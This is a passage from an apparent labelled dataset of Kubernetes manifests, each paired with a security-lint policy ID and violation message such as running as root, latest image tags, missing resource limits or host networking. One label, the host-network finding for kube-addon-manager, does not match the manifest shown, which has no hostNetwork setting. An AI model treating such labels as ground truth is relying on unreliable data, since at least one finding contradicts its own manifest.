    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20190808-9137ac3e9\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --build-cluster=/etc/cluster/cluster\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/cluster\n          name: cluster\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: cluster\n        secret:\n          defaultMode: 420\n          secretName: build-cluster\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"deck\" has memory limit 0"
  },
  {
    "id": "11695",
    "manifest_path": "data/manifests/the_stack_sample/sample_4516.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: ombi\n  name: ombi\n  namespace: seedbox\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ombi\n  template:\n    metadata:\n      labels:\n        app: ombi\n    spec:\n      containers:\n      - image: ghcr.io/linuxserver/ombi\n        name: ombi\n        ports:\n        - containerPort: 3579\n          name: http\n        env:\n        - name: PUID\n          value: '1000'\n        - name: PGID\n          value: '1000'\n        - name: TZ\n          value: Europe/Paris\n        volumeMounts:\n        - mountPath: /config\n          name: ombi-config\n      volumes:\n      - name: ombi-config\n        persistentVolumeClaim:\n          claimName: ombi-config\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"ombi\" is using an invalid container image, \"ghcr.io/linuxserver/ombi\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11696",
    "manifest_path": "data/manifests/the_stack_sample/sample_4516.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: ombi\n  name: ombi\n  namespace: seedbox\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ombi\n  template:\n    metadata:\n      labels:\n        app: ombi\n    spec:\n      containers:\n      - image: ghcr.io/linuxserver/ombi\n        name: ombi\n        ports:\n        - containerPort: 3579\n          name: http\n        env:\n        - name: PUID\n          value: '1000'\n        - name: PGID\n          value: '1000'\n        - name: TZ\n          value: Europe/Paris\n        volumeMounts:\n        - mountPath: /config\n          name: ombi-config\n      volumes:\n      - name: ombi-config\n        persistentVolumeClaim:\n          claimName: ombi-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ombi\" does not have a read-only root file system"
  },
  {
    "id": "11697",
    "manifest_path": "data/manifests/the_stack_sample/sample_4516.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: ombi\n  name: ombi\n  namespace: seedbox\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ombi\n  template:\n    metadata:\n      labels:\n        app: ombi\n    spec:\n      containers:\n      - image: ghcr.io/linuxserver/ombi\n        name: ombi\n        ports:\n        - containerPort: 3579\n          name: http\n        env:\n        - name: PUID\n          value: '1000'\n        - name: PGID\n          value: '1000'\n        - name: TZ\n          value: Europe/Paris\n        volumeMounts:\n        - mountPath: /config\n          name: ombi-config\n      volumes:\n      - name: ombi-config\n        persistentVolumeClaim:\n          claimName: ombi-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ombi\" is not set to runAsNonRoot"
  },
  {
    "id": "11698",
    "manifest_path": "data/manifests/the_stack_sample/sample_4516.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: ombi\n  name: ombi\n  namespace: seedbox\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ombi\n  template:\n    metadata:\n      labels:\n        app: ombi\n    spec:\n      containers:\n      - image: ghcr.io/linuxserver/ombi\n        name: ombi\n        ports:\n        - containerPort: 3579\n          name: http\n        env:\n        - name: PUID\n          value: '1000'\n        - name: PGID\n          value: '1000'\n        - name: TZ\n          value: Europe/Paris\n        volumeMounts:\n        - mountPath: /config\n          name: ombi-config\n      volumes:\n      - name: ombi-config\n        persistentVolumeClaim:\n          claimName: ombi-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ombi\" has cpu request 0"
  },
  {
    "id": "11699",
    "manifest_path": "data/manifests/the_stack_sample/sample_4516.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: ombi\n  name: ombi\n  namespace: seedbox\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ombi\n  template:\n    metadata:\n      labels:\n        app: ombi\n    spec:\n      containers:\n      - image: ghcr.io/linuxserver/ombi\n        name: ombi\n        ports:\n        - containerPort: 3579\n          name: http\n        env:\n        - name: PUID\n          value: '1000'\n        - name: PGID\n          value: '1000'\n        - name: TZ\n          value: Europe/Paris\n        volumeMounts:\n        - mountPath: /config\n          name: ombi-config\n      volumes:\n      - name: ombi-config\n        persistentVolumeClaim:\n          claimName: ombi-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ombi\" has memory limit 0"
  },
  {
    "id": "11700",
    "manifest_path": "data/manifests/the_stack_sample/sample_4517.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kube-addon-manager\n  namespace: kube-system\n  labels:\n    component: kube-addon-manager\n    version: v4\nspec:\n  containers:\n  - name: kube-addon-manager\n    image: gcr.io/google-containers/kube-addon-manager:v5.2\n    resources:\n      requests:\n        cpu: 5m\n        memory: 50Mi\n    volumeMounts:\n    - mountPath: /etc/kubernetes/\n      name: addons\n      readOnly: true\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes/\n    name: addons\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "11701",
    "manifest_path": "data/manifests/the_stack_sample/sample_4517.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kube-addon-manager\n  namespace: kube-system\n  labels:\n    component: kube-addon-manager\n    version: v4\nspec:\n  containers:\n  - name: kube-addon-manager\n    image: gcr.io/google-containers/kube-addon-manager:v5.2\n    resources:\n      requests:\n        cpu: 5m\n        memory: 50Mi\n    volumeMounts:\n    - mountPath: /etc/kubernetes/\n      name: addons\n      readOnly: true\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes/\n    name: addons\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kube-addon-manager\" does not have a read-only root file system"
  },
  {
    "id": "11702",
    "manifest_path": "data/manifests/the_stack_sample/sample_4517.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kube-addon-manager\n  namespace: kube-system\n  labels:\n    component: kube-addon-manager\n    version: v4\nspec:\n  containers:\n  - name: kube-addon-manager\n    image: gcr.io/google-containers/kube-addon-manager:v5.2\n    resources:\n      requests:\n        cpu: 5m\n        memory: 50Mi\n    volumeMounts:\n    - mountPath: /etc/kubernetes/\n      name: addons\n      readOnly: true\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes/\n    name: addons\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kube-addon-manager\" is not set to runAsNonRoot"
  },
  {
    "id": "11703",
    "manifest_path": "data/manifests/the_stack_sample/sample_4517.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kube-addon-manager\n  namespace: kube-system\n  labels:\n    component: kube-addon-manager\n    version: v4\nspec:\n  containers:\n  - name: kube-addon-manager\n    image: gcr.io/google-containers/kube-addon-manager:v5.2\n    resources:\n      requests:\n        cpu: 5m\n        memory: 50Mi\n    volumeMounts:\n    - mountPath: /etc/kubernetes/\n      name: addons\n      readOnly: true\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes/\n    name: addons\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kube-addon-manager\" has memory limit 0"
  },
  {
    "id": "11704",
    "manifest_path": "data/manifests/the_stack_sample/sample_4519.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: fluentd-cloud-logging\n  namespace: kube-system\n  labels:\n    k8s-app: fluentd-logging\n  annotations:\n    scheduler.alpha.kubernetes.io/critical-pod: ''\nspec:\n  containers:\n  - name: fluentd-cloud-logging\n    image: gcr.io/google_containers/fluentd-gcp:2.0.1\n    command:\n    - /bin/sh\n    - -c\n    - \"mkdir /etc/fluent/config.d &&\\n  echo \\\"$FLUENTD_CONFIG\\\" > /etc/fluent/config.d/main.conf\\\n      \\ &&\\n  /run.sh $FLUENTD_ARGS 2>&1 >>/var/log/fluentd.log\"\n    env:\n    - name: FLUENTD_ARGS\n      value: --no-supervisor\n    - name: FLUENTD_CONFIG\n      value: \"# This configuration file for Fluentd is used\\n# to watch changes to\\\n        \\ Docker log files that live in the\\n# directory /var/lib/docker/containers/\\\n        \\ and are symbolically\\n# linked to from the /var/log/containers directory\\\n        \\ using names that capture the\\n# pod name and container name. These logs\\\n        \\ are then submitted to\\n# Google Cloud Logging which assumes the installation\\\n        \\ of the cloud-logging plug-in.\\n#\\n# Example\\n# =======\\n# A line in the\\\n        \\ Docker log file might look like this JSON:\\n#\\n# {\\\"log\\\":\\\"2014/09/25 21:15:03\\\n        \\ Got request with path wombat\\\\\\\\n\\\",\\n#  \\\"stream\\\":\\\"stderr\\\",\\n#   \\\"\\\n        time\\\":\\\"2014-09-25T21:15:03.499185026Z\\\"}\\n#\\n# The record reformer is used\\\n        \\ to write the tag to focus on the pod name\\n# and the Kubernetes container\\\n        \\ name. For example a Docker container's logs\\n# might be in the directory:\\n\\\n        #  /var/lib/docker/containers/997599971ee6366d4a5920d25b79286ad45ff37a74494f262e3bc98d909d0a7b\\n\\\n        # and in the file:\\n#  997599971ee6366d4a5920d25b79286ad45ff37a74494f262e3bc98d909d0a7b-json.log\\n\\\n        # where 997599971ee6... is the Docker ID of the running container.\\n# The\\\n        \\ Kubernetes kubelet makes a symbolic link to this file on the host machine\\n\\\n        # in the /var/log/containers directory which includes the pod name and the\\\n        \\ Kubernetes\\n# container name:\\n#    synthetic-logger-0.25lps-pod_default-synth-lgr-997599971ee6366d4a5920d25b79286ad45ff37a74494f262e3bc98d909d0a7b.log\\n\\\n        #    ->\\n#    /var/lib/docker/containers/997599971ee6366d4a5920d25b79286ad45ff37a74494f262e3bc98d909d0a7b/997599971ee6366d4a5920d25b79286ad45ff37a74494f262e3bc98d909d0a7b-json.log\\n\\\n        # The /var/log directory on the host is mapped to the /var/log directory in\\\n        \\ the container\\n# running this instance of Fluentd and we end up collecting\\\n        \\ the file:\\n#   /var/log/containers/synthetic-logger-0.25lps-pod_default-synth-lgr-997599971ee6366d4a5920d25b79286ad45ff37a74494f262e3bc98d909d0a7b.log\\n\\\n        # This results in the tag:\\n#  var.log.containers.synthetic-logger-0.25lps-pod_default-synth-lgr-997599971ee6366d4a5920d25b79286ad45ff37a74494f262e3bc98d909d0a7b.log\\n\\\n        # The record reformer is used is discard the var.log.containers prefix and\\n\\\n        # the Docker container ID suffix and \\\"kubernetes.\\\" is pre-pended giving\\\n        \\ the tag:\\n#   kubernetes.synthetic-logger-0.25lps-pod_default-synth-lgr\\n\\\n        # Tag is then parsed by google_cloud plugin and translated to the metadata,\\n\\\n        # visible in the log viewer\\n\\n# Example:\\n# {\\\"log\\\":\\\"[info:2016-02-16T16:04:05.930-08:00]\\\n        \\ Some log text here\\\\\\\\n\\\",\\\"stream\\\":\\\"stdout\\\",\\\"time\\\":\\\"2016-02-17T00:04:05.931087621Z\\\"\\\n        }\\n<source>\\n  type tail\\n  format json\\n  time_key time\\n  path /var/log/containers/*.log\\n\\\n        \\  pos_file /var/log/gcp-containers.log.pos\\n  time_format %Y-%m-%dT%H:%M:%S.%N%Z\\n\\\n        \\  tag reform.*\\n  read_from_head true\\n</source>\\n\\n<filter reform.**>\\n\\\n        \\  type parser\\n  format /^(?<severity>\\\\\\\\w)(?<time>\\\\\\\\d{4} [^\\\\\\\\s]*)\\\\\\\n        \\\\s+(?<pid>\\\\\\\\d+)\\\\\\\\s+(?<source>[^ \\\\\\\\]]+)\\\\\\\\] (?<log>.*)/\\n  reserve_data\\\n        \\ true\\n  suppress_parse_error_log true\\n  key_name log\\n</filter>\\n\\n<match\\\n        \\ reform.**>\\n  type record_reformer\\n  enable_ruby true\\n  tag raw.kubernetes.${tag_suffix[4].split('-')[0..-2].join('-')}\\n\\\n        </match>\\n\\n# Detect exceptions in the log output and forward them as one\\\n        \\ log entry.\\n<match raw.kubernetes.**>\\n  @type copy\\n\\n  <store>\\n    @type\\\n        \\ prometheus\\n\\n    <metric>\\n      type counter\\n      name logging_line_count\\n\\\n        \\      desc Total number of lines generated by application containers\\n  \\\n        \\    <labels>\\n        tag ${tag}\\n      </labels>\\n    </metric>\\n  </store>\\n\\\n        \\  <store>\\n    @type detect_exceptions\\n\\n    remove_tag_prefix raw\\n   \\\n        \\ message log\\n    stream stream\\n    multiline_flush_interval 5\\n    max_bytes\\\n        \\ 500000\\n    max_lines 1000\\n  </store>\\n</match>\\n\\n# Example:\\n# 2015-12-21\\\n        \\ 23:17:22,066 [salt.state       ][INFO    ] Completed state [net.ipv4.ip_forward]\\\n        \\ at time 23:17:22.066081\\n<source>\\n  type tail\\n  format /^(?<time>[^ ]*\\\n        \\ [^ ,]*)[^\\\\\\\\[]*\\\\\\\\[[^\\\\\\\\]]*\\\\\\\\]\\\\\\\\[(?<severity>[^ \\\\\\\\]]*) *\\\\\\\\] (?<message>.*)$/\\n\\\n        \\  time_format %Y-%m-%d %H:%M:%S\\n  path /var/log/salt/minion\\n  pos_file\\\n        \\ /var/log/gcp-salt.pos\\n  tag salt\\n</source>\\n\\n# Example:\\n# Dec 21 23:17:22\\\n        \\ gke-foo-1-1-4b5cbd14-node-4eoj startupscript: Finished running startup script\\\n        \\ /var/run/google.startup.script\\n<source>\\n  type tail\\n  format syslog\\n\\\n        \\  path /var/log/startupscript.log\\n  pos_file /var/log/gcp-startupscript.log.pos\\n\\\n        \\  tag startupscript\\n</source>\\n\\n# Examples:\\n# time=\\\"2016-02-04T06:51:03.053580605Z\\\"\\\n        \\ level=info msg=\\\"GET /containers/json\\\"\\n# time=\\\"2016-02-04T07:53:57.505612354Z\\\"\\\n        \\ level=error msg=\\\"HTTP Error\\\" err=\\\"No such image: -f\\\" statusCode=404\\n\\\n        <source>\\n  type tail\\n  format /^time=\\\"(?<time>[^)]*)\\\" level=(?<severity>[^\\\n        \\ ]*) msg=\\\"(?<message>[^\\\"]*)\\\"( err=\\\"(?<error>[^\\\"]*)\\\")?( statusCode=($<status_code>\\\\\\\n        \\\\d+))?/\\n  path /var/log/docker.log\\n  pos_file /var/log/gcp-docker.log.pos\\n\\\n        \\  tag docker\\n</source>\\n\\n# Example:\\n# 2016/02/04 06:52:38 filePurge: successfully\\\n        \\ removed file /var/etcd/data/member/wal/00000000000006d0-00000000010a23d1.wal\\n\\\n        <source>\\n  type tail\\n  # Not parsing this, because it doesn't have anything\\\n        \\ particularly useful to\\n  # parse out of it (like severities).\\n  format\\\n        \\ none\\n  path /var/log/etcd.log\\n  pos_file /var/log/gcp-etcd.log.pos\\n \\\n        \\ tag etcd\\n</source>\\n\\n# Multi-line parsing is required for all the kube\\\n        \\ logs because very large log\\n# statements, such as those that include entire\\\n        \\ object bodies, get split into\\n# multiple lines by glog.\\n\\n# Example:\\n\\\n        # I0204 07:32:30.020537    3368 server.go:1048] POST /stats/container/: (13.972191ms)\\\n        \\ 200 [[Go-http-client/1.1] 10.244.1.3:40537]\\n<source>\\n  type tail\\n  format\\\n        \\ multiline\\n  multiline_flush_interval 5s\\n  format_firstline /^\\\\\\\\w\\\\\\\\\\\n        d{4}/\\n  format1 /^(?<severity>\\\\\\\\w)(?<time>\\\\\\\\d{4} [^\\\\\\\\s]*)\\\\\\\\s+(?<pid>\\\\\\\n        \\\\d+)\\\\\\\\s+(?<source>[^ \\\\\\\\]]+)\\\\\\\\] (?<message>.*)/\\n  time_format %m%d\\\n        \\ %H:%M:%S.%N\\n  path /var/log/kubelet.log\\n  pos_file /var/log/gcp-kubelet.log.pos\\n\\\n        \\  tag kubelet\\n</source>\\n\\n# Example:\\n# I1118 21:26:53.975789       6 proxier.go:1096]\\\n        \\ Port \\\"nodePort for kube-system/default-http-backend:http\\\" (:31429/tcp)\\\n        \\ was open before and is still needed\\n<source>\\n  type tail\\n  format multiline\\n\\\n        \\  multiline_flush_interval 5s\\n  format_firstline /^\\\\\\\\w\\\\\\\\d{4}/\\n  format1\\\n        \\ /^(?<severity>\\\\\\\\w)(?<time>\\\\\\\\d{4} [^\\\\\\\\s]*)\\\\\\\\s+(?<pid>\\\\\\\\d+)\\\\\\\\\\\n        s+(?<source>[^ \\\\\\\\]]+)\\\\\\\\] (?<message>.*)/\\n  time_format %m%d %H:%M:%S.%N\\n\\\n        \\  path /var/log/kube-proxy.log\\n  pos_file /var/log/gcp-kube-proxy.log.pos\\n\\\n        \\  tag kube-proxy\\n</source>\\n\\n# Example:\\n# I0204 07:00:19.604280      \\\n        \\ 5 handlers.go:131] GET /api/v1/nodes: (1.624207ms) 200 [[kube-controller-manager/v1.1.3\\\n        \\ (linux/amd64) kubernetes/6a81b50] 127.0.0.1:38266]\\n<source>\\n  type tail\\n\\\n        \\  format multiline\\n  multiline_flush_interval 5s\\n  format_firstline /^\\\\\\\n        \\\\w\\\\\\\\d{4}/\\n  format1 /^(?<severity>\\\\\\\\w)(?<time>\\\\\\\\d{4} [^\\\\\\\\s]*)\\\\\\\\\\\n        s+(?<pid>\\\\\\\\d+)\\\\\\\\s+(?<source>[^ \\\\\\\\]]+)\\\\\\\\] (?<message>.*)/\\n  time_format\\\n        \\ %m%d %H:%M:%S.%N\\n  path /var/log/kube-apiserver.log\\n  pos_file /var/log/gcp-kube-apiserver.log.pos\\n\\\n        \\  tag kube-apiserver\\n</source>\\n\\n# Example:\\n# 2017-02-09T00:15:57.992775796Z\\\n        \\ AUDIT: id=\\\"90c73c7c-97d6-4b65-9461-f94606ff825f\\\" ip=\\\"104.132.1.72\\\" method=\\\"\\\n        GET\\\" user=\\\"kubecfg\\\" as=\\\"<self>\\\" asgroups=\\\"<lookup>\\\" namespace=\\\"default\\\"\\\n        \\ uri=\\\"/api/v1/namespaces/default/pods\\\"\\n# 2017-02-09T00:15:57.993528822Z\\\n        \\ AUDIT: id=\\\"90c73c7c-97d6-4b65-9461-f94606ff825f\\\" response=\\\"200\\\"\\n<source>\\n\\\n        \\  type tail\\n  format multiline\\n  multiline_flush_interval 5s\\n  format_firstline\\\n        \\ /^\\\\\\\\S+\\\\\\\\s+AUDIT:/\\n  # Fields must be explicitly captured by name to\\\n        \\ be parsed into the record.\\n  # Fields may not always be present, and order\\\n        \\ may change, so this just looks\\n  # for a list of key=\\\"\\\\\\\\\\\"quoted\\\\\\\\\\\n        \\\" value\\\" pairs separated by spaces.\\n  # Unknown fields are ignored.\\n \\\n        \\ # Note: We can't separate query/response lines as format1/format2 because\\n\\\n        \\  #       they don't always come one after the other for a given query.\\n\\\n        \\  # TODO: Maybe add a JSON output mode to audit log so we can get rid of\\\n        \\ this?\\n  format1 /^(?<time>\\\\\\\\S+) AUDIT:(?: (?:id=\\\"(?<id>(?:[^\\\"\\\\\\\\\\\\\\\n        \\\\]|\\\\\\\\\\\\\\\\.)*)\\\"|ip=\\\"(?<ip>(?:[^\\\"\\\\\\\\\\\\\\\\]|\\\\\\\\\\\\\\\\.)*)\\\"|method=\\\"(?<method>(?:[^\\\"\\\n        \\\\\\\\\\\\\\\\]|\\\\\\\\\\\\\\\\.)*)\\\"|user=\\\"(?<user>(?:[^\\\"\\\\\\\\\\\\\\\\]|\\\\\\\\\\\\\\\\.)*)\\\"|groups=\\\"\\\n        (?<groups>(?:[^\\\"\\\\\\\\\\\\\\\\]|\\\\\\\\\\\\\\\\.)*)\\\"|as=\\\"(?<as>(?:[^\\\"\\\\\\\\\\\\\\\\]|\\\\\\\\\\\n        \\\\\\\\.)*)\\\"|asgroups=\\\"(?<asgroups>(?:[^\\\"\\\\\\\\\\\\\\\\]|\\\\\\\\\\\\\\\\.)*)\\\"|namespace=\\\"\\\n        (?<namespace>(?:[^\\\"\\\\\\\\\\\\\\\\]|\\\\\\\\\\\\\\\\.)*)\\\"|uri=\\\"(?<uri>(?:[^\\\"\\\\\\\\\\\\\\\\\\\n        ]|\\\\\\\\\\\\\\\\.)*)\\\"|response=\\\"(?<response>(?:[^\\\"\\\\\\\\\\\\\\\\]|\\\\\\\\\\\\\\\\.)*)\\\"|\\\\\\\n        \\\\w+=\\\"(?:[^\\\"\\\\\\\\\\\\\\\\]|\\\\\\\\\\\\\\\\.)*\\\"))*/\\n  time_format %FT%T.%L%Z\\n  path\\\n        \\ /var/log/kube-apiserver-audit.log\\n  pos_file /var/log/gcp-kube-apiserver-audit.log.pos\\n\\\n        \\  tag kube-apiserver-audit\\n</source>\\n\\n# Example:\\n# I0204 06:55:31.872680\\\n        \\       5 servicecontroller.go:277] LB already exists and doesn't need update\\\n        \\ for service kube-system/kube-ui\\n<source>\\n  type tail\\n  format multiline\\n\\\n        \\  multiline_flush_interval 5s\\n  format_firstline /^\\\\\\\\w\\\\\\\\d{4}/\\n  format1\\\n        \\ /^(?<severity>\\\\\\\\w)(?<time>\\\\\\\\d{4} [^\\\\\\\\s]*)\\\\\\\\s+(?<pid>\\\\\\\\d+)\\\\\\\\\\\n        s+(?<source>[^ \\\\\\\\]]+)\\\\\\\\] (?<message>.*)/\\n  time_format %m%d %H:%M:%S.%N\\n\\\n        \\  path /var/log/kube-controller-manager.log\\n  pos_file /var/log/gcp-kube-controller-manager.log.pos\\n\\\n        \\  tag kube-controller-manager\\n</source>\\n\\n# Example:\\n# W0204 06:49:18.239674\\\n        \\       7 reflector.go:245] pkg/scheduler/factory/factory.go:193: watch of\\\n        \\ *api.Service ended with: 401: The event in requested index is outdated and\\\n        \\ cleared (the requested history has been cleared [2578313/2577886]) [2579312]\\n\\\n        <source>\\n  type tail\\n  format multiline\\n  multiline_flush_interval 5s\\n\\\n        \\  format_firstline /^\\\\\\\\w\\\\\\\\d{4}/\\n  format1 /^(?<severity>\\\\\\\\w)(?<time>\\\\\\\n        \\\\d{4} [^\\\\\\\\s]*)\\\\\\\\s+(?<pid>\\\\\\\\d+)\\\\\\\\s+(?<source>[^ \\\\\\\\]]+)\\\\\\\\] (?<message>.*)/\\n\\\n        \\  time_format %m%d %H:%M:%S.%N\\n  path /var/log/kube-scheduler.log\\n  pos_file\\\n        \\ /var/log/gcp-kube-scheduler.log.pos\\n  tag kube-scheduler\\n</source>\\n\\n\\\n        # Example:\\n# I1104 10:36:20.242766       5 rescheduler.go:73] Running Rescheduler\\n\\\n        <source>\\n  type tail\\n  format multiline\\n  multiline_flush_interval 5s\\n\\\n        \\  format_firstline /^\\\\\\\\w\\\\\\\\d{4}/\\n  format1 /^(?<severity>\\\\\\\\w)(?<time>\\\\\\\n        \\\\d{4} [^\\\\\\\\s]*)\\\\\\\\s+(?<pid>\\\\\\\\d+)\\\\\\\\s+(?<source>[^ \\\\\\\\]]+)\\\\\\\\] (?<message>.*)/\\n\\\n        \\  time_format %m%d %H:%M:%S.%N\\n  path /var/log/rescheduler.log\\n  pos_file\\\n        \\ /var/log/gcp-rescheduler.log.pos\\n  tag rescheduler\\n</source>\\n\\n# Example:\\n\\\n        # I0603 15:31:05.793605       6 cluster_manager.go:230] Reading config from\\\n        \\ path /etc/gce.conf\\n<source>\\n  type tail\\n  format multiline\\n  multiline_flush_interval\\\n        \\ 5s\\n  format_firstline /^\\\\\\\\w\\\\\\\\d{4}/\\n  format1 /^(?<severity>\\\\\\\\w)(?<time>\\\\\\\n        \\\\d{4} [^\\\\\\\\s]*)\\\\\\\\s+(?<pid>\\\\\\\\d+)\\\\\\\\s+(?<source>[^ \\\\\\\\]]+)\\\\\\\\] (?<message>.*)/\\n\\\n        \\  time_format %m%d %H:%M:%S.%N\\n  path /var/log/glbc.log\\n  pos_file /var/log/gcp-glbc.log.pos\\n\\\n        \\  tag glbc\\n</source>\\n\\n# Example:\\n# I0603 15:31:05.793605       6 cluster_manager.go:230]\\\n        \\ Reading config from path /etc/gce.conf\\n<source>\\n  type tail\\n  format\\\n        \\ multiline\\n  multiline_flush_interval 5s\\n  format_firstline /^\\\\\\\\w\\\\\\\\\\\n        d{4}/\\n  format1 /^(?<severity>\\\\\\\\w)(?<time>\\\\\\\\d{4} [^\\\\\\\\s]*)\\\\\\\\s+(?<pid>\\\\\\\n        \\\\d+)\\\\\\\\s+(?<source>[^ \\\\\\\\]]+)\\\\\\\\] (?<message>.*)/\\n  time_format %m%d\\\n        \\ %H:%M:%S.%N\\n  path /var/log/cluster-autoscaler.log\\n  pos_file /var/log/gcp-cluster-autoscaler.log.pos\\n\\\n        \\  tag cluster-autoscaler\\n</source>\\n\\n# Logs from systemd-journal for interesting\\\n        \\ services.\\n<source>\\n  type systemd\\n  filters [{ \\\"_SYSTEMD_UNIT\\\": \\\"\\\n        docker.service\\\" }]\\n  pos_file /var/log/gcp-journald-docker.pos\\n  read_from_head\\\n        \\ true\\n  tag docker\\n</source>\\n\\n<source>\\n  type systemd\\n  filters [{\\\n        \\ \\\"_SYSTEMD_UNIT\\\": \\\"kubelet.service\\\" }]\\n  pos_file /var/log/gcp-journald-kubelet.pos\\n\\\n        \\  read_from_head true\\n  tag kubelet\\n</source>\\n\\n# Prometheus monitoring\\n\\\n        <source>\\n  @type prometheus\\n  port 80\\n</source>\\n\\n<source>\\n  @type prometheus_monitor\\n\\\n        </source>\\n\\n# We use 2 output stanzas - one to handle the container logs\\\n        \\ and one to handle\\n# the node daemon logs, the latter of which explicitly\\\n        \\ sends its logs to the\\n# compute.googleapis.com service rather than container.googleapis.com\\\n        \\ to keep\\n# them separate since most users don't care about the node logs.\\n\\\n        <match kubernetes.**>\\n  @type copy\\n\\n  <store>\\n    @type google_cloud\\n\\\n        \\n    # Set the buffer type to file to improve the reliability and reduce\\\n        \\ the memory consumption\\n    buffer_type file\\n    buffer_path /var/log/fluentd-buffers/kubernetes.containers.buffer\\n\\\n        \\    # Set queue_full action to block because we want to pause gracefully\\n\\\n        \\    # in case of the off-the-limits load instead of throwing an exception\\n\\\n        \\    buffer_queue_full_action block\\n    # Set the chunk limit conservatively\\\n        \\ to avoid exceeding the GCL limit\\n    # of 10MiB per write request.\\n  \\\n        \\  buffer_chunk_limit 2M\\n    # Cap the combined memory usage of this buffer\\\n        \\ and the one below to\\n    # 2MiB/chunk * (6 + 2) chunks = 16 MiB\\n    buffer_queue_limit\\\n        \\ 6\\n    # Never wait more than 5 seconds before flushing logs in the non-error\\\n        \\ case.\\n    flush_interval 5s\\n    # Never wait longer than 30 seconds between\\\n        \\ retries.\\n    max_retry_wait 30\\n    # Disable the limit on the number of\\\n        \\ retries (retry forever).\\n    disable_retry_limit\\n    # Use multiple threads\\\n        \\ for processing.\\n    num_threads 2\\n  </store>\\n  <store>\\n    @type prometheus\\n\\\n        \\n    <metric>\\n      type counter\\n      name logging_entry_count\\n     \\\n        \\ desc Total number of log entries generated by either an application container\\\n        \\ or a system component\\n      <labels>\\n        tag ${tag}\\n        component\\\n        \\ container\\n      </labels>\\n    </metric>\\n  </store>\\n</match>\\n\\n# Keep\\\n        \\ a smaller buffer here since these logs are less important than the user's\\n\\\n        # container logs.\\n<match **>\\n  @type copy\\n\\n  <store>\\n    @type google_cloud\\n\\\n        \\n    detect_subservice false\\n    buffer_type file\\n    buffer_path /var/log/fluentd-buffers/kubernetes.system.buffer\\n\\\n        \\    buffer_queue_full_action block\\n    buffer_chunk_limit 2M\\n    buffer_queue_limit\\\n        \\ 2\\n    flush_interval 5s\\n    max_retry_wait 30\\n    disable_retry_limit\\n\\\n        \\    num_threads 2\\n  </store>\\n  <store>\\n    @type prometheus\\n\\n    <metric>\\n\\\n        \\      type counter\\n      name logging_entry_count\\n      desc Total number\\\n        \\ of log entries generated by either an application container or a system\\\n        \\ component\\n      <labels>\\n        tag ${tag}\\n        component system\\n\\\n        \\      </labels>\\n    </metric>\\n  </store>\\n</match>\"\n    resources:\n      limits:\n        memory: 200Mi\n      requests:\n        cpu: 100m\n        memory: 